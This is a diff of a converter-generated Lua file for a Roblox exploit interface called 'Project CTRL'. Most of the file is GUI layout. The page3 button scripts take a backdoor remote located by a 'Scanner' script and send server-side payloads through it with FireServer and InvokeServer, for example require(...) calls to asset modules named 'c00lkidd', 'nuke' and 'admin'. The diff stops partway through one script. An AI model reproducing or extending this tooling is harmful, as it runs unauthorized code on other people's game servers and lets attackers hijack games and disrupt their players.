+G2L["86"]["BorderSizePixel"] = 0;
+G2L["86"]["TextSize"] = 14;
+G2L["86"]["TextScaled"] = true;
+G2L["86"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["86"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["86"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["86"]["BackgroundTransparency"] = 1;
+G2L["86"]["Size"] = UDim2.new(0, 361, 0, 33);
+G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["86"]["Text"] = [[Sensation]];
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-G2L["8c"] = Instance.new("LocalScript", G2L["89"]);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["87"] = Instance.new("UIStroke", G2L["86"]);
 
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-G2L["8d"] = Instance.new("LocalScript", G2L["89"]);
-G2L["8d"]["Name"] = [[Notify]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
+G2L["88"] = Instance.new("UIStroke", G2L["86"]);
+G2L["88"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-G2L["8e"] = Instance.new("LocalScript", G2L["89"]);
-G2L["8e"]["Name"] = [[Warner]];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+G2L["89"] = Instance.new("LocalScript", G2L["86"]);
 
 
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.Warner
-G2L["8f"] = Instance.new("LocalScript", G2L["3e"]);
-G2L["8f"]["Name"] = [[Warner]];
 
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["8a"] = Instance.new("ImageButton", G2L["2"]);
+G2L["8a"]["BorderSizePixel"] = 0;
+G2L["8a"]["BackgroundTransparency"] = 1;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8a"]["Image"] = [[rbxassetid://11347112400]];
+G2L["8a"]["Size"] = UDim2.new(0, 43, 0, 43);
+G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8a"]["Position"] = UDim2.new(0, 0, 0.12162, 0);
 
--- StarterGui.project CTRL.Frame.page3.TextLabel
-G2L["90"] = Instance.new("TextLabel", G2L["3d"]);
-G2L["90"]["TextWrapped"] = true;
+
+-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
+G2L["8b"] = Instance.new("UIStroke", G2L["8a"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["8c"] = Instance.new("LocalScript", G2L["8a"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["8d"] = Instance.new("ImageButton", G2L["2"]);
+G2L["8d"]["BorderSizePixel"] = 0;
+G2L["8d"]["BackgroundTransparency"] = 1;
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8d"]["Image"] = [[rbxassetid://11570895459]];
+G2L["8d"]["Size"] = UDim2.new(0, 43, 0, 43);
+G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8d"]["Position"] = UDim2.new(0, 0, 0.26689, 0);
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
+G2L["8e"] = Instance.new("UIStroke", G2L["8d"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["8f"] = Instance.new("LocalScript", G2L["8d"]);
+
+
+
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["90"] = Instance.new("ImageButton", G2L["2"]);
 G2L["90"]["BorderSizePixel"] = 0;
-G2L["90"]["TextSize"] = 14;
-G2L["90"]["TextScaled"] = true;
-G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["90"]["TextColor3"] = Color3.fromRGB(171, 255, 0);
 G2L["90"]["BackgroundTransparency"] = 1;
-G2L["90"]["Size"] = UDim2.new(0, 378, 0, 25);
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["90"]["Image"] = [[rbxassetid://1365082776]];
+G2L["90"]["Size"] = UDim2.new(0, 43, 0, 43);
 G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["90"]["Text"] = [[Scripts]];
+G2L["90"]["Position"] = UDim2.new(0, 0, 0.41216, 0);
 
 
--- StarterGui.project CTRL.Frame.page3.TextLabel.UIStroke
+-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
 G2L["91"] = Instance.new("UIStroke", G2L["90"]);
 
 
 
--- StarterGui.project CTRL.Frame.ImageButton
-G2L["92"] = Instance.new("ImageButton", G2L["2"]);
-G2L["92"]["BorderSizePixel"] = 0;
-G2L["92"]["BackgroundTransparency"] = 1;
--- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
-G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["92"]["Image"] = [[rbxassetid://139667892596151]];
-G2L["92"]["Size"] = UDim2.new(0, 45, 0, 46);
-G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["92"]["Position"] = UDim2.new(0, 0, 0.59459, 0);
-
-
--- StarterGui.project CTRL.Frame.ImageButton.UIStroke
-G2L["93"] = Instance.new("UIStroke", G2L["92"]);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["92"] = Instance.new("LocalScript", G2L["90"]);
 
 
 
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-G2L["94"] = Instance.new("LocalScript", G2L["92"]);
+-- StarterGui.ScreenGui.Frame.page4
+G2L["93"] = Instance.new("Frame", G2L["2"]);
+G2L["93"]["BorderSizePixel"] = 0;
+G2L["93"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
+G2L["93"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["93"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
+G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["93"]["Name"] = [[page4]];
+G2L["93"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.ScreenGui.Frame.page4.ScrollingFrame
+G2L["94"] = Instance.new("ScrollingFrame", G2L["93"]);
+G2L["94"]["Active"] = true;
+G2L["94"]["BorderSizePixel"] = 0;
+G2L["94"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
+G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["94"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
+G2L["94"]["Size"] = UDim2.new(0, 361, 0, 260);
+G2L["94"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["94"]["ScrollBarThickness"] = 3;
+G2L["94"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.ScreenGui.Frame.page4.ScrollingFrame.LocalScript
+G2L["95"] = Instance.new("LocalScript", G2L["94"]);
 
 
 
--- StarterGui.project CTRL.Frame.page4
-G2L["95"] = Instance.new("Frame", G2L["2"]);
-G2L["95"]["Visible"] = false;
-G2L["95"]["BorderSizePixel"] = 0;
-G2L["95"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["95"]["Size"] = UDim2.new(0, 378, 0, 258);
-G2L["95"]["Position"] = UDim2.new(0.10638, 0, 0.12838, 0);
-G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["95"]["Name"] = [[page4]];
-G2L["95"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.project CTRL.Frame.page4.TextLabel
-G2L["96"] = Instance.new("TextLabel", G2L["95"]);
-G2L["96"]["TextWrapped"] = true;
+-- StarterGui.ScreenGui.Frame.ImageButton
+G2L["96"] = Instance.new("ImageButton", G2L["2"]);
 G2L["96"]["BorderSizePixel"] = 0;
-G2L["96"]["TextSize"] = 14;
-G2L["96"]["TextScaled"] = true;
-G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["96"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["96"]["BackgroundTransparency"] = 1;
-G2L["96"]["Size"] = UDim2.new(0, 378, 0, 40);
+-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
+G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["96"]["Image"] = [[rbxassetid://101630023371308]];
+G2L["96"]["Size"] = UDim2.new(0, 43, 0, 43);
 G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["96"]["Text"] = [[Console]];
-G2L["96"]["Position"] = UDim2.new(0.00794, 0, -0.00041, 0);
+G2L["96"]["Position"] = UDim2.new(0, 0, 0.55743, 0);
 
 
--- StarterGui.project CTRL.Frame.page4.TextLabel.UIStroke
+-- StarterGui.ScreenGui.Frame.ImageButton.UIStroke
 G2L["97"] = Instance.new("UIStroke", G2L["96"]);
 
 
 
--- StarterGui.project CTRL.Frame.page4.ScrollingFrame
-G2L["98"] = Instance.new("ScrollingFrame", G2L["95"]);
-G2L["98"]["Active"] = true;
-G2L["98"]["BorderSizePixel"] = 0;
-G2L["98"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
-G2L["98"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["98"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
-G2L["98"]["Size"] = UDim2.new(0, 375, 0, 219);
-G2L["98"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["98"]["Position"] = UDim2.new(0.00794, 0, 0.15116, 0);
-G2L["98"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["98"]["ScrollBarThickness"] = 3;
-G2L["98"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.project CTRL.Frame.page4.ScrollingFrame.UIStroke
-G2L["99"] = Instance.new("UIStroke", G2L["98"]);
+-- StarterGui.ScreenGui.Frame.ImageButton.LocalScript
+G2L["98"] = Instance.new("LocalScript", G2L["96"]);
 
 
 
--- StarterGui.project CTRL.Frame.page4.ScrollingFrame.LocalScript
-G2L["9a"] = Instance.new("LocalScript", G2L["98"]);
+-- StarterGui.ScreenGui.Scanner
+G2L["99"] = Instance.new("LocalScript", G2L["1"]);
+G2L["99"]["Name"] = [[Scanner]];
 
 
-
--- StarterGui.project CTRL.Scanner
-G2L["9b"] = Instance.new("LocalScript", G2L["1"]);
-G2L["9b"]["Name"] = [[Scanner]];
-
-
--- StarterGui.project CTRL.Frame.page1.ImageLabel.LocalScript
-local function C_a()
-local script = G2L["a"];
-	-- Place this LocalScript inside the ImageLabel
-	local Players = game:GetService("Players")
-	local imageLabel = script.Parent
-	local player = Players.LocalPlayer
-	
-	-- Wait until the player is fully loaded
-	if not player.Character then
-		player.CharacterAdded:Wait()
-	end
-	
-	-- Get the player's thumbnail
-	local function updateThumbnail()
-		local userId = player.UserId
-		local thumbnailType = Enum.ThumbnailType.HeadShot
-		local thumbnailSize = Enum.ThumbnailSize.Size420x420
-		
-		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbnailType, thumbnailSize)
-		if isReady then
-			imageLabel.Image = content
-		end
-	end
-	
-	updateThumbnail()
-end;
-task.spawn(C_a);
--- StarterGui.project CTRL.Frame.page1.TextLabel.LocalScript
-local function C_e()
-local script = G2L["e"];
-	script.Parent.Text = 'Welcome, ' .. game.Players.LocalPlayer.Name .. '!'
-end;
-task.spawn(C_e);
--- StarterGui.project CTRL.Frame.Dragify
-local function C_17()
-local script = G2L["17"];
+-- StarterGui.ScreenGui.Frame.Dragify
+local function C_6()
+local script = G2L["6"];
 	local frame = script.Parent
 	local UIS = game:GetService("UserInputService")
 	
@@ -1276,8 +1291,42 @@ local script = G2L["17"];
 		end
 	end)
 end;
-task.spawn(C_17);
--- StarterGui.project CTRL.Frame.page2.Text.LocalScript
+task.spawn(C_6);
+-- StarterGui.ScreenGui.Frame.page1.ImageLabel.LocalScript
+local function C_b()
+local script = G2L["b"];
+	-- Place this LocalScript inside the ImageLabel
+	local Players = game:GetService("Players")
+	local imageLabel = script.Parent
+	local player = Players.LocalPlayer
+	
+	-- Wait until the player is fully loaded
+	if not player.Character then
+		player.CharacterAdded:Wait()
+	end
+	
+	-- Get the player's thumbnail
+	local function updateThumbnail()
+		local userId = player.UserId
+		local thumbnailType = Enum.ThumbnailType.HeadShot
+		local thumbnailSize = Enum.ThumbnailSize.Size420x420
+		
+		local content, isReady = Players:GetUserThumbnailAsync(userId, thumbnailType, thumbnailSize)
+		if isReady then
+			imageLabel.Image = content
+		end
+	end
+	
+	updateThumbnail()
+end;
+task.spawn(C_b);
+-- StarterGui.ScreenGui.Frame.page1.TextLabel.LocalScript
+local function C_f()
+local script = G2L["f"];
+	script.Parent.Text = 'Welcome, ' .. game.Players.LocalPlayer.Name .. '!'
+end;
+task.spawn(C_f);
+-- StarterGui.ScreenGui.Frame.page2.Text.LocalScript
 local function C_1a()
 local script = G2L["1a"];
 	local scrollingFrame = script.Parent
@@ -1294,7 +1343,7 @@ local script = G2L["1a"];
 	end)
 end;
 task.spawn(C_1a);
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.LocalScript
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
 local function C_20()
 local script = G2L["20"];
 	local textBox = script.Parent
@@ -1319,7 +1368,7 @@ local script = G2L["20"];
 	updateLineNumbers()
 end;
 task.spawn(C_20);
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.Completor
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.Completor
 local function C_21()
 local script = G2L["21"];
 	local textBox = script.Parent
@@ -1499,266 +1548,355 @@ local script = G2L["21"];
 	textBox:GetPropertyChangedSignal("Text"):Connect(updateTooltip)
 end;
 task.spawn(C_21);
--- StarterGui.project CTRL.Frame.page2.Text.TextBox.LocalScript
+-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
 local function C_22()
 local script = G2L["22"];
 	script.Parent.Text = 'print("Project SHIFT SS")'
 end;
 task.spawn(C_22);
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-local function C_36()
-local script = G2L["36"];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_3d()
+local script = G2L["3d"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = true
-		script.Parent.Parent.page2.Visible = false
-		script.Parent.Parent.page3.Visible = false
-		script.Parent.Parent.page4.Visible = false
-	end)
-end;
-task.spawn(C_36);
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-local function C_39()
-local script = G2L["39"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = false
-		script.Parent.Parent.page2.Visible = true
-		script.Parent.Parent.page3.Visible = false
-		script.Parent.Parent.page4.Visible = false
-	end)
-end;
-task.spawn(C_39);
--- StarterGui.project CTRL.Frame.ImageButton.LocalScript
-local function C_3c()
-local script = G2L["3c"];
-	script.Parent.MouseButton1Click:Connect(function()
-		script.Parent.Parent.page1.Visible = false
-		script.Parent.Parent.page2.Visible = false
-		script.Parent.Parent.page3.Visible = true
-		script.Parent.Parent.page4.Visible = false
-	end)
-end;
-task.spawn(C_3c);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_44()
-local script = G2L["44"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(14125553864):Fire("' .. game.Players.LocalPlayer.Name .. '","c00lkidd")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
-			end
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
 		end
+		
+		local rawcode = 'require(14125553864):Fire("' .. username .. '","c00lkidd")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_44);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
+task.spawn(C_3d);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_41()
+local script = G2L["41"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = ' require(14572394952)("' .. username .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
+	end)
+end;
+task.spawn(C_41);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
 local function C_45()
 local script = G2L["45"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(7192763922).load("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
 task.spawn(C_45);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_46()
-local script = G2L["46"];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_49()
+local script = G2L["49"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_46);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_4a()
-local script = G2L["4a"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(134785314770716).load("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(15267263357).V11("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_4a);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-local function C_4b()
-local script = G2L["4b"];
+task.spawn(C_49);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_4d()
+local script = G2L["4d"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_4b);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_4c()
-local script = G2L["4c"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_4c);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_50()
-local script = G2L["50"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(75026282232818).load("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(78790302691160):Hload("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_50);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
+task.spawn(C_4d);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
 local function C_51()
 local script = G2L["51"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
+			pcall(function()
+				starterGui:SetCore("SendNotification", {
+					Title = "Project CTRL",
+					Text = "Inject first before executing!",
+					Duration = 5
+				})
+			end)
+			return
+		end
+		
+		local rawcode = 'require(12350030542).RC7("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
+			end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
 task.spawn(C_51);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_52()
-local script = G2L["52"];
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_55()
+local script = G2L["55"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_52);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_56()
-local script = G2L["56"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(70681531110549).admin("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(17776365113).kj("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_56);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
-local function C_57()
-local script = G2L["57"];
+task.spawn(C_55);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
+local function C_59()
+local script = G2L["59"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
+	local username = players.LocalPlayer.Name
+	
 	script.Parent.MouseButton1Click:Connect(function()
-		game.StarterGui:SetCore("SendNotification", {
-			Title = "Project CTRL",
-			Text = "Ran script successfully!",
-			Duration = 5
-		})
-	end)
-end;
-task.spawn(C_57);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Warner
-local function C_58()
-local script = G2L["58"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor == nil or getgenv().confirmedType == nil then
+		local backdoor = getgenv().confirmedBackdoor
+		local backdoorType = getgenv().confirmedType
+		
+		if not backdoor then
 			pcall(function()
-				game.StarterGui:SetCore("SendNotification", {
+				starterGui:SetCore("SendNotification", {
 					Title = "Project CTRL",
-					Text = "Inject before executing!",
+					Text = "Inject first before executing!",
 					Duration = 5
 				})
 			end)
+			return
 		end
-	end)
-end;
-task.spawn(C_58);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.LocalScript
-local function C_5c()
-local script = G2L["5c"];
-	script.Parent.MouseButton1Click:Connect(function()
-		if getgenv().confirmedBackdoor then
-			local rawcode = 'require(73499991934326):Pload("' .. game.Players.LocalPlayer.Name .. '")'
-			if getgenv().confirmedType == "RemoteEvent" then
-				getgenv().confirmedBackdoor:FireServer(rawcode)
-			elseif getgenv().confirmedType == "RemoteFunction" then
-				getgenv().confirmedBackdoor:InvokeServer(rawcode)
+		
+		local rawcode = 'require(135686792632620).nuke("' .. game.Players.LocalPlayer.Name .. '")'
+		
+		pcall(function()
+			if backdoorType == "RemoteEvent" then
+				backdoor:FireServer(rawcode)
+			elseif backdoorType == "RemoteFunction" then
+				backdoor:InvokeServer(rawcode)
 			end
-		end
+			
+			starterGui:SetCore("SendNotification", {
+				Title = "Project CTRL",
+				Text = "Script executed successfully!",
+				Duration = 5
+			})
+		end)
 	end)
 end;
-task.spawn(C_5c);
--- StarterGui.project CTRL.Frame.page3.ScrollingFrame.TextButton.Notify
+task.spawn(C_59);
+-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
 local function C_5d()
 local script = G2L["5d"];
+	local players = game:GetService("Players")
+	local starterGui = game:GetService("StarterGui")
